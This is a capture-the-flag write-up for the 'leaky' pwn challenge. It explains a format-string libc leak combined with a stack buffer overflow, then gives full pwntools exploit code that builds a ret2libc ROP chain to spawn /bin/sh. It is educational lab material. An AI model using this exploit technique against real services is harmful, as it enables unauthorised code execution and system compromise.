---
title: "KaliTeamCTF: Leaky Pwm Writeup"
date: 2026-08-05
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "kaliteamctf"
  - "binary exploitation"
  - "reverse-engineering"
---

This will be a shorter writeup than my usual long documentation like writeups. Last night I spent an hour or two in KaliTeam CTF and managed to solve all of the first wave pwn challenges. First two was quite easy, only `leaky` provided a little bit of challenge. This writeup will summarize how I solved the leaky pwn challenge.

## Initial Look

We are provided the libc file and the executable binary. Thanks to the author, runpath is set so it loads the LD and libc from the current directory. It makes things simpler. Looking at security measures: `No canary, No PIE and full relro`. Nice, we don't have to leak canary and PIE base. Looking at the decompiled code, it is quite a simple binary with one challenge function:

```cpp
void challenge(void)
{
  char local_18 [16];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome! Enter input:");
  read(0,local_18,0x60);
  printf(local_18);
  return;
}
```

Two bugs present:

1. Format string bug: user input is printed straight away
2. BOF: Read is reading a lot more than the buffer holds

## Solution

Path to solution is straightforward:

1. Leak libc with format string bug
2. In that run, also buffer overflow and return back to start so we can exploit again
3. Use the discovered libc base: ROP to system(/bin/sh)

### First Exploit

In the first run we have to exploit format string bug to leak a libc address while also doing buffer overflow to modify return address to go back to start of the binary. To leak a libc address we look at the stack:

![Stack](/assets/img/kaliteam_stack.png)

Looking at the stack we have two candidates to leak: \_rtld\_global and libc start main return point. I picked the second one, it seemed easier to access. With a bit of trial and error, I found `%31$p` would leak that address:

```python
payload = b'%31$p   ' + b'A' * 16 + p64(elf.sym._start)

p.sendlineafter(b':', payload)

p.recvline()
recv = p.recv(14)
print(recv)

leak = int(recv,16)
libc_base = leak - (libc.sym.__libc_start_main + 128)
```

Since PIE is disabled, modifying the return address was simple, I tried going back to challenge function initially but I had stack alignment issues in printf call, but going back to `p64(elf.sym._start)` worked cleanly without any issues for the second run of the binary.

### Second Exploit

Now we know the libc base and we returned back to the start, so we can exploit again to get a shell. To get shell I simply went for system(/bin/sh) ROP chain. Maybe I could try one gadget, but this seemed easy as I already had the same ROP chain in previous challenges. ROP chain:

```python
rop = ROP(libc)
poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]    

system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
ret_addr = rop.find_gadget(['ret'])[0] 

payload = b'A' * 24
payload += p64(poprdi_ret_addr) + p64(binsh)
payload += p64(ret_addr) + p64(system)

p.sendlineafter(b':', payload)
```

Just one thing to note `p64(ret_addr) + p64(system)`  here we before call the system we rop to a single ret gadget. This is used for stack alignment to put system call in a place where it is happy to execute. Rest is usual ROP, get rdi to hold a pointer to /bin/sh so call to system receives it. 


## Final Code

Overall simple and nice challenge. Two stage exploit with a ROP chain to get shell. 

```python
from pwn import *

exe = './leaky'

context.binary = exe
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']

elf = ELF(exe)
libc = ELF('./libc.so.6')


gdbscript = '''
b *challenge+128
'''.format(**locals())

p = process(exe)
#p = gdb.debug(exe, gdbscript=gdbscript)
#p = remote('chall.kali-team.online', 10053)

payload = b'%31$p   ' + b'A' * 16 + p64(elf.sym._start)

p.sendlineafter(b':', payload)

p.recvline()
recv = p.recv(14)
print(recv)

leak = int(recv,16)
libc_base = leak - (libc.sym.__libc_start_main + 128)

print(f'LIBC: {hex(libc_base)}')

libc.address = libc_base

rop = ROP(libc)
poprdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]    

system = libc.symbols['system']
binsh  = next(libc.search(b'/bin/sh'))
ret_addr = rop.find_gadget(['ret'])[0] 

payload = b'A' * 24
payload += p64(poprdi_ret_addr) + p64(binsh)
payload += p64(ret_addr) + p64(system)

p.sendlineafter(b':', payload)
p.interactive()

```

More challenges to come, more things to learn. As always, keep learning!